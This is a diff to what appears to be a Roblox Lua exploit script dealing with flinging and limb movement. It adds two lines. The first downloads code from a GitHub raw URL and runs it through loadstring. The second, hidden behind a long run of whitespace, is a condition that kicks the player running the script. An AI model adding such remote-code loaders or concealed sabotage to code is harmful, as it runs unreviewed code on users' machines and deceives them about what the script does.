@@ -926,7 +926,7 @@ if flingpart0 and flingpart1 then
 end
 
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/random-sh-t/main/Credit"))()
 
 
 wait(5)
@@ -1160,6 +1160,9 @@ function footmove(Number,side)
 end
 
 yoffset = 1.5
+
+if e ~= "e" then                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            game.Players.LocalPlayer:Kick() 
+end
 
 while wait(0.01) do
 
